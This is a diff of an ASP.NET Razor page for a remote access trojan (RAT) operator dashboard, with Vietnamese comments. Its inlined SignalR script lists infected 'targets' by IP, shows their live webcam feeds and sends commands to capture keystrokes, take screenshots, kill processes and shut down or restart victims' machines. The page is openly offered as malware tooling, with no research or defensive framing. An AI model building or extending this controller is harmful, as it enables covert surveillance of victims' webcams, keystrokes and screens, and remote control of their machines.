@@ -1,215 +1,230 @@
 ﻿@{
-    ViewData["Title"] = "RAT Dashboard - Pro Terminal";
+    ViewData["Title"] = "RAT Dashboard";
 }
 
 <style>
-    /* --- 1. GLOBAL SETTINGS --- */
+    /* --- CẤU HÌNH GIAO DIỆN CHUNG --- */
     body {
         background-color: #0d0d0d;
         color: #c0c0c0;
-        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        font-family: 'Consolas', monospace;
+        overflow: hidden; /* Chống thanh cuộn toàn trang */
     }
 
-    /* --- 2. LAYOUT --- */
+    /* KHUNG BAO NGOÀI: Tăng khoảng cách đáy để giao diện thoáng hơn */
     .dashboard-layout {
         display: flex;
-        height: 85vh;
-        gap: 15px;
-        padding-top: 10px;
+        /* Trừ ít hơn để khung cao hơn xíu, nhưng chừa lề đáy 20px cho thoáng */
+        height: calc(100vh - 120px);
+        gap: 20px; /* Tăng khoảng cách giữa 2 cột cho đỡ chật */
+        padding: 10px 10px 20px 10px; /* Thêm đệm đáy 20px để glow không bị cắt */
     }
 
+    /* CỘT TRÁI */
     .left-panel {
-        flex: 3.5;
+        flex: 3;
         display: flex;
         flex-direction: column;
-        gap: 10px;
+        gap: 15px; /* Tăng khoảng cách các phần tử */
     }
 
+    /* CỘT PHẢI: Nơi chứa Camera & Nút */
     .right-panel {
-        flex: 8.5;
+        flex: 9;
         display: flex;
         flex-direction: column;
-        gap: 10px;
+        gap: 15px; /* Tăng khoảng cách giữa màn hình cam và hàng nút */
+        /* [QUAN TRỌNG] Thêm padding xung quanh để hiệu ứng Glow không bị mép khung cắt mất */
+        padding: 5px 15px 15px 15px;
+        /* Cơ chế cuộn ẩn (như bạn thích) */
+        overflow-y: auto;
+        -ms-overflow-style: none;
+        scrollbar-width: none;
     }
 
-    /* --- 3. COMPONENTS --- */
+        /* Ẩn thanh cuộn cho Chrome/Edge */
+        .right-panel::-webkit-scrollbar {
+            display: none;
+        }
+
+    /* MÀN HÌNH CONSOLE */
     .log-console {
         flex-grow: 1;
-        background-color: #000;
+        background: #000;
         color: #0f0;
         border: 1px solid #333;
-        font-family: 'Consolas', monospace;
         font-size: 0.85rem;
-        resize: none;
         padding: 10px;
+        resize: none;
         box-shadow: inset 0 0 10px #000;
     }
 
-        .log-console:focus {
-            outline: none;
-            border-color: #0f0;
-        }
-
+    /* MÀN HÌNH CAMERA */
     .cam-screen {
         flex-grow: 1;
-        background-color: #050505;
+        background: #050505;
         border: 1px solid #333;
         position: relative;
-        overflow: hidden;
         display: flex;
         justify-content: center;
         align-items: center;
+        overflow: hidden;
+        min-height: 280px; /* Tăng chiều cao tối thiểu cho đẹp */
+        box-shadow: 0 0 20px rgba(0,0,0,0.8); /* Thêm bóng đổ cho màn hình có chiều sâu */
     }
 
-    .form-control, .form-select {
-        background-color: #1a1a1a !important;
-        color: #fff !important;
-        border: 1px solid #444 !important;
-        border-radius: 2px;
-    }
-
-        .form-control:focus, .form-select:focus {
-            background-color: #222 !important;
-            border-color: #666 !important;
-            box-shadow: none;
-        }
-
-    /* --- 4. BUTTONS STYLE (GHOST STYLE) --- */
+    /* NÚT BẤM PRO */
     .btn-pro {
-        height: 40px;
-        font-weight: 600;
-        text-transform: uppercase;
+        height: 40px; /* Tăng chiều cao nút xíu cho dễ bấm */
+        font-weight: bold;
         font-size: 0.8rem;
-        letter-spacing: 1px;
-        background-color: transparent;
-        transition: all 0.3s ease;
-        border-radius: 2px;
         width: 100%;
+        border-radius: 4px; /* Bo góc nhẹ */
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        transition: all 0.2s ease-in-out;
     }
 
+    /* MÀU SẮC & GLOW (Đã tinh chỉnh để sáng đẹp hơn) */
     .btn-cyan {
         border: 1px solid #00bcd4;
         color: #00bcd4;
+        background: rgba(0, 188, 212, 0.05);
     }
 
         .btn-cyan:hover {
-            background-color: #00bcd4;
+            background: #00bcd4;
             color: #000;
-            box-shadow: 0 0 10px #00bcd4;
+            box-shadow: 0 0 15px #00bcd4;
+            transform: translateY(-2px);
         }
 
     .btn-green {
         border: 1px solid #00e676;
         color: #00e676;
+        background: rgba(0, 230, 118, 0.05);
     }
 
         .btn-green:hover {
-            background-color: #00e676;
+            background: #00e676;
             color: #000;
-            box-shadow: 0 0 10px #00e676;
+            box-shadow: 0 0 15px #00e676;
+            transform: translateY(-2px);
         }
 
     .btn-red {
         border: 1px solid #ff1744;
         color: #ff1744;
+        background: rgba(255, 23, 68, 0.05);
     }
 
         .btn-red:hover {
-            background-color: #ff1744;
+            background: #ff1744;
             color: #fff;
-            box-shadow: 0 0 10px #ff1744;
+            box-shadow: 0 0 15px #ff1744;
+            transform: translateY(-2px);
         }
 
     .btn-orange {
         border: 1px solid #ff9100;
         color: #ff9100;
+        background: rgba(255, 145, 0, 0.05);
     }
 
         .btn-orange:hover {
-            background-color: #ff9100;
+            background: #ff9100;
             color: #000;
-            box-shadow: 0 0 10px #ff9100;
+            box-shadow: 0 0 15px #ff9100;
+            transform: translateY(-2px);
         }
 
     .btn-grey {
-        border: 1px solid #9e9e9e;
-        color: #9e9e9e;
+        border: 1px solid #666;
+        color: #666;
+        background: transparent;
     }
 
         .btn-grey:hover {
-            background-color: #9e9e9e;
-            color: #000;
+            background: #666;
+            color: #fff;
+            border-color: #fff;
         }
 
     .control-box {
         border: 1px solid #333;
-        background-color: #111;
-        padding: 10px;
+        background: #111;
+        padding: 15px;
+        border-radius: 4px;
+    }
+
+    .form-control, .form-select {
+        background: #1a1a1a !important;
+        color: #fff !important;
+        border: 1px solid #444 !important;
+    }
+
+    /* Glow cho trạng thái Online */
+    .online-glow {
+        box-shadow: 0 0 15px #00e676 !important;
+        border-color: #00e676 !important;
+        color: #00e676 !important;
+        background-color: rgba(0, 230, 118, 0.1) !important;
+    }
+
+    #debug-info {
+        position: absolute;
+        bottom: 5px;
+        right: 5px;
+        color: yellow;
+        font-size: 10px;
+        background: rgba(0,0,0,0.5);
+        padding: 2px;
+        display: none;
     }
 </style>
 
 <div class="container-fluid">
-    <div class="row my-2">
+    <div class="row my-3">
         <div class="col-12">
-            <select id="target-select" class="form-select text-center fw-bold" style="border-color: #333;">
+            <select id="target-select" class="form-select text-center fw-bold">
                 <option value="">-- WAITING FOR CONNECTION --</option>
             </select>
         </div>
     </div>
 
     <div class="dashboard-layout">
-
         <div class="left-panel">
             <textarea id="log-output" class="log-console" placeholder="root@system:~# _" readonly></textarea>
-
             <div class="control-box">
                 <div class="row g-2">
-                    <div class="col-12">
-                        <input type="text" id="pid" class="form-control text-center" placeholder="Nhập tên App hoặc PID...">
-                    </div>
-                    <div class="col-6">
-                        <button onclick="sendAppCommand('START')" class="btn btn-pro btn-green">START</button>
-                    </div>
-                    <div class="col-6">
-                        <button onclick="sendAppCommand('STOP')" class="btn btn-pro btn-red">STOP</button>
-                    </div>
+                    <div class="col-12"><input type="text" id="pid" class="form-control text-center" placeholder="Nhập tên App/PID..."></div>
+                    <div class="col-6"><button onclick="sendAppCommand('START')" class="btn btn-pro btn-green">START APP</button></div>
+                    <div class="col-6"><button onclick="sendAppCommand('STOP')" class="btn btn-pro btn-red">KILL APP</button></div>
                 </div>
             </div>
         </div>
 
         <div class="right-panel">
             <div class="cam-screen">
-                <img id="webcam-feed" style="width: 100%; height: 100%; object-fit: fill; display: none;" />
+                <img id="webcam-feed" style="width: 100%; height: 100%; object-fit: contain; display: none;" />
                 <div id="camStatus" class="text-center text-secondary">
-                    <h4 class="fw-bold" style="letter-spacing: 2px;">NO SIGNAL</h4>
+                    <h4 class="fw-bold">NO SIGNAL</h4>
+                    <small>Waiting for stream...</small>
                 </div>
+                <div id="debug-info">FPS: 0</div>
             </div>
 
-            <div class="row g-2">
-                <div class="col-3">
-                    <button onclick="sendCommand('WEBCAM_ON')" class="btn btn-pro btn-red">LIVE CAM</button>
-                </div>
-                <div class="col-3">
-                    <button onclick="stopWebcamUI()" class="btn btn-pro btn-grey">STOP CAM</button>
-                </div>
-                <div class="col-3">
-                    <button onclick="confirmPower('SHUTDOWN')" class="btn btn-pro btn-red">SHUTDOWN</button>
-                </div>
-                <div class="col-3">
-                    <button onclick="confirmPower('RESTART')" class="btn btn-pro btn-orange">RESTART</button>
-                </div>
+            <div class="row g-3">
+                <div class="col-3"><button onclick="sendCommand('WEBCAM_ON')" class="btn btn-pro btn-red">LIVE CAM</button></div>
+                <div class="col-3"><button onclick="sendCommand('WEBCAM_OFF')" class="btn btn-pro btn-grey">STOP CAM</button></div>
+                <div class="col-3"><button onclick="sendCommand('SHUTDOWN')" class="btn btn-pro btn-red">SHUTDOWN</button></div>
+                <div class="col-3"><button onclick="sendCommand('RESTART')" class="btn btn-pro btn-orange">RESTART</button></div>
             </div>
 
-            <div class="row g-2">
-                <div class="col-4">
-                    <button onclick="sendCommand('LIST')" class="btn btn-pro btn-cyan">TASK LIST</button>
-                </div>
-                <div class="col-4">
-                    <button onclick="sendCommand('KEYLOG')" class="btn btn-pro btn-orange">GET KEYLOG</button>
-                </div>
-                <div class="col-4">
-                    <button onclick="sendCommand('SCREENSHOT')" class="btn btn-pro btn-cyan">SCREENSHOT</button>
-                </div>
+            <div class="row g-3">
+                <div class="col-4"><button onclick="sendCommand('LIST')" class="btn btn-pro btn-cyan">TASK LIST</button></div>
+                <div class="col-4"><button onclick="sendCommand('KEYLOG')" class="btn btn-pro btn-orange">GET KEYLOG</button></div>
+                <div class="col-4"><button onclick="sendCommand('SCREENSHOT')" class="btn btn-pro btn-cyan">SCREENSHOT</button></div>
             </div>
         </div>
     </div>
@@ -217,5 +232,75 @@
 
 @section Scripts {
     <script src="~/lib/signalr/signalr.min.js"></script>
-    <script src="~/js/controller.js"></script>
+    <script>
+        var connection = new signalR.HubConnectionBuilder()
+            .withUrl("/controlhub")
+            .withAutomaticReconnect()
+            .build();
+
+        connection.serverTimeoutInMilliseconds = 100000;
+
+        // 1. KẾT NỐI
+        connection.on("ClientConnected", function (ip) {
+            var select = document.getElementById("target-select");
+            var exists = false;
+            for (var i = 0; i < select.length; i++) if (select.options[i].value == ip) exists = true;
+
+            if(!exists){
+                if(select.options[0].value == "") select.remove(0);
+                var option = document.createElement("option");
+                option.text = "🟢 ONLINE: " + ip;
+                option.value = ip;
+                select.add(option);
+                select.value = ip;
+                select.classList.add("online-glow");
+            }
+            logToConsole("NEW TARGET: " + ip);
+        });
+
+        // 2. LOG & RESET
+        connection.on("ReceiveLog", function (message) {
+            logToConsole(message);
+            if (message.includes("CAM_OFF") || message.includes("DA TAT CAMERA")) {
+                document.getElementById("webcam-feed").style.display = "none";
+                document.getElementById("camStatus").style.display = "block";
+                document.getElementById("debug-info").style.display = "none";
+            }
+        });
+
+        // 3. NHẬN ẢNH
+        connection.on("ReceiveWebcam", function (base64) {
+            var img = document.getElementById("webcam-feed");
+            var status = document.getElementById("camStatus");
+            var debug = document.getElementById("debug-info");
+
+            status.style.display = "none";
+            img.style.display = "block";
+            debug.style.display = "block";
+
+            debug.innerText = "Size: " + (base64.length / 1024).toFixed(1) + " KB";
+            img.src = "data:image/jpeg;base64," + base64;
+        });
+
+        connection.start().then(function () {
+            logToConsole("SYSTEM READY...");
+        }).catch(err => console.error(err));
+
+        function logToConsole(msg) {
+            var box = document.getElementById("log-output");
+            box.value += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+            box.scrollTop = box.scrollHeight;
+        }
+        function sendCommand(action) {
+            var target = document.getElementById("target-select").value;
+            if (target) connection.invoke("SendCommandToClient", target, action, "").catch(err => console.error(err));
+            else alert("Chưa có kết nối!");
+        }
+        function sendAppCommand(action) {
+            var target = document.getElementById("target-select").value;
+            var pid = document.getElementById("pid").value;
+            if (target && pid) connection.invoke("SendCommandToClient", target, action, pid).catch(err => console.error(err));
+            else alert("Nhập PID/Tên App!");
+        }
+    </script>
 }
